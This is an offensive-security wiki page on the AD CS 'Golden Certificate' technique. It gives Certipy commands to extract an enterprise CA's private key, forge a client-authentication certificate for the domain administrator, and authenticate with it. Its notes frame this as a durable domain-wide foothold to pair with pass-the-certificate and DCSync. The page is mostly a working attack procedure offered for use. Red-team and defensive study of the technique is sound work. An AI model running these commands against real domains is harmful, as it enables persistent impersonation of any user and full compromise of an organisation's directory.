---
title: "Golden Certificate: forging with the CA private key"
description: "Stealing an enterprise CA's private key and using it to forge client-authentication certificates for any principal offline, a domain-wide and long-lived persistence primitive analogous to a golden ticket but for AD CS."
keywords:
  - golden certificate
  - CA private key
  - forge
  - Certipy
  - persistence
---

# Golden Certificate

Once you hold **local administrator on the CA server**, you can steal the CA's own **private key**. With that key you sign **arbitrary client-authentication certificates** for any principal, entirely offline, and the domain trusts them because the CA that issued them is in the NTAuth store. This is the certificate equivalent of a [golden ticket](../kerberos/forged-tickets.md): not a single escalation but **durable, domain-wide impersonation** that survives password resets and lasts until the CA certificate itself expires.

## Stealing the key and forging

```bash
# 1. Back up the CA certificate and private key (needs local admin on the CA host)
certipy ca -backup -ca 'EXAMPLE-CA' -u user@example.local -p <password> -target ca.example.local

# 2. Forge a certificate for any principal, signed by the stolen CA key, offline
certipy forge -ca-pfx EXAMPLE-CA.pfx -upn administrator@example.local -out administrator_forged.pfx

# 3. Authenticate with the forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip <dc>
```

## Exploitation notes

- The forged certificate needs **no interaction with the CA** after the key is stolen, so it is invisible to the issuing pipeline and works while the CA cert is valid (often years).
- It is **persistence**, not just escalation: re-forge for any user at any time, including after the target changes their password, so it is a favourite long-term foothold once a CA is owned.
- Forge for a **Domain Admin or a DC** and pair with [pass-the-certificate](theft-and-pass-the-certificate.md) or [Schannel](schannel.md) to authenticate, then DCSync.
- This follows naturally from owning the CA through [CA configuration](ca-configuration.md) or [access-control](access-control.md) abuse, so treat CA-server compromise as a cue to grab the key for persistence.

## Tools

- **Certipy** (`ca -backup`, `forge`, `auth`): extract the CA key and forge certificates.
- **ForgeCert** (GhostPack): forge a certificate from a stolen CA PFX.

## References

- [SpecterOps: Certified Pre-Owned (DPERSIST domain persistence)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certipy wiki: post-exploitation, golden certificates](https://github.com/ly4k/Certipy/wiki/07-%E2%80%90-Post%E2%80%90Exploitation)
- [The Hacker Recipes: golden certificate](https://www.thehacker.recipes/ad/persistence/adcs/golden-certificate)
